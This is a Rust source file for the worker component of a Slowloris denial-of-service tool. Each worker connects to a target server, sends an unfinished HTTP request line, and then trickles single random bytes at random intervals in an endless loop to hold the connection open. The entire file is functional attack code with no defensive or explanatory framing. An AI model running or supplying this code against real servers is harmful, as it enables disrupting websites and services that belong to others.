use rand::rngs::SmallRng;
use rand::{FromEntropy, Rng};
use std::io::{Error, Write};
use std::net::TcpStream;
use std::thread;
use std::time::Duration;

pub struct Worker {
    id: u8,
    sleep_bounds: (u8, u8),
    verbose: i32,
    stream: TcpStream,
}

impl Worker {
    pub fn new(
        id: u8,
        ip: &String,
        port: &String,
        sleep_bounds: (u8, u8),
        verbose: i32,
    ) -> Result<Worker, Error> {
        let mut stream = TcpStream::connect(format!("{}:{}", ip, port))?;
        stream.write_all("GET / HTTP/1.1\r\n".as_bytes())?;

        Ok(Worker {
            id,
            sleep_bounds,
            verbose,
            stream,
        })
    }

    pub fn start(&mut self) {
        let mut rng = SmallRng::from_entropy();

        loop {
            thread::sleep(Duration::from_secs(
                rng.gen_range(self.sleep_bounds.0, self.sleep_bounds.1) as u64,
            ));
            match &self.stream.write_all(&rng.gen::<[u8; 1]>()) {
                Ok(_) if (*&self.verbose > 0) => {
                    println!("[slowloris_{:02}] Update sent.", self.id)
                }
                _ => {
                    if *&self.verbose > 0 {
                        println!("[slowloris_{:02}] Update failed.", self.id);
                    }
                }
            }
        }
    }
}
